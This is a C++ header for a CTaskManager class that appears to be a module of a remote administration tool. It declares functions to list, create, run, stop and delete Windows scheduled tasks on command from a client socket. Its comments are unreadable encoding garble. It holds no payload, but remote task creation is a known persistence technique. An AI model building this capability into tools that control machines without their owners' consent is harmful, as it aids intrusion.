#pragma once
#include "../../PublicInclude/Manager.h"
#include <taskschd.h>

class CTaskManager : public CManager
{
public:
	CTaskManager(CClientSocket* pClient);
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	~CTaskManager();
	PBYTE GetTaskAll(ITaskFolder* pFolder);							//��ȡĿ¼�µ���������
	PBYTE GetFolderAll(ITaskFolder* pFolder);							//��ȡĿ¼�µ���Ŀ¼
	PBYTE GetRoot();																//��ȡ��Ŀ¼�µ����ļ���

	BOOL CreateTask(LPBYTE lpBuffer);							//�����ƻ�����
	BOOL RunOrStopTask(LPBYTE lpBuffer, BOOL Action);  //ִ�л�ֹͣ
	BOOL DelTask(LPBYTE lpBuffer);								//ɾ���ƻ�����
	BOOL GetProgramPath(ITaskDefinition* iDefinition,BSTR* exepath);
	void SaveData(BSTR taskname, BSTR path, BSTR exepath, char* status, DATE LastTime, DATE NextTime);  //�������ݵ�������
private:
	ITaskService* pService = NULL;				//���Ӽƻ������
	PBYTE lpList = NULL;								//��������ƻ�������
	DWORD offset = 0;								//ƫ��
	DWORD nBufferSize = 0;						//�ڴ��С
};

